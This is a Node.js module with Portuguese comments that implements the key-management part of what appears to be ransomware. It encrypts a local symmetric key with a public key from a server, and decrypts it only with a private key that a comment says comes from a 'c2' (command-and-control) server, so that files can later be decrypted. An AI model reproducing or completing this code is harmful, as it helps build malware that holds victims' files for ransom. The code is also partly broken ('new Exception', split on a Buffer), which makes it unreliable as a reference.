const Crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const saveKey = require("./saveKey");

/**
 * Provedor das principais funções de encriptação
 * @var cipher public or private asymetric KeyObject
 * @see https://nodejs.org/dist/latest-v11.x/docs/api/crypto.html#crypto_class_keyobject
 */
class EncryptionProvider {
  constructor() {
    this.cipher = null;
  }

  /**
   * importa a chave pública recebida do sevidor que será utilizada para gerar a `secret key`
   * que utilizaremos na encriptação dos dados localmente.
   * @param { string } publicKey Chave pública recebida do servidor
   * @see https://nodejs.org/api/crypto.html#crypto_crypto_createpublickey_key
   */
  importPublicKey(publicKey) {
    /**
     * Public Key importada do Servidor remoto
     */
    this.cipher = Crypto.createPublicKey({
      key: publicKey,
      format: "pem",
      type: "pkcs1"
    });
  }

  /**
   * Encripta a chave simétrica `encryptionKey` e salva localmente
   * @param { Buffer } encryptionKey
   * @return void
   */
  saveEncryptionKey(encryptionKey) {
    var encryptedKey;
    if (this.cipher) {
      encryptionKey = Buffer.from(encryptionKey);
      encryptedKey = Crypto.publicEncrypt(this.cipher, encryptionKey);
      return saveKey(encryptedKey, "secret.bin");
    } else {
      throw new Exception(
        "É necessário importar a chave pública antes de salvar a chave"
      );
    }
  }

  /**
   *  Importa e converte a chave privada assimétrica recebida do servidor c2
   * @param {String} privateKey
   * @return void
   */
  importPrivateKey(privateKey) {
    this.cipher = Crypto.createPrivateKey({
      key: privateKey,
      format: "pem",
      type: "pkcs1"
    });
  }

  /**
   * Carrega a chave simétrica local para desencriptação dos arquivos
   * @var encSymetricKey chave simétrica encriptada pela chave pública anteriormente
   * @var symetricKey chave simétrica desencriptada pela chave privada agora
   * @return { Object }
   */
  loadEncryptionKey() {
    var symetricKey, encSymetricKey;
    if (this.cipher) {
      // lê a chave simétrica que está encriptada no disco local
      const symetricPath = path.join(__dirname, "..", "keys", "secret.bin");
      encSymetricKey = fs.readFileSync(symetricPath);
      //  desencripta a chave simétrica local
      if (!Buffer.isBuffer(encSymetricKey)) {
        encSymetricKey = Buffer.from(encSymetricKey, "utf8");
      }
      symetricKey = Crypto.privateDecrypt(this.cipher, encSymetricKey);
      const keyArr = symetricKey.split(":");
      const IV = keyArr[0],
        KEY = keyArr[1];
      return { IV, KEY };
    } else {
      throw new Exception(
        "É necessário importar a chave privada antes de carregar a chave"
      );
    }
  }
}

module.exports = EncryptionProvider;
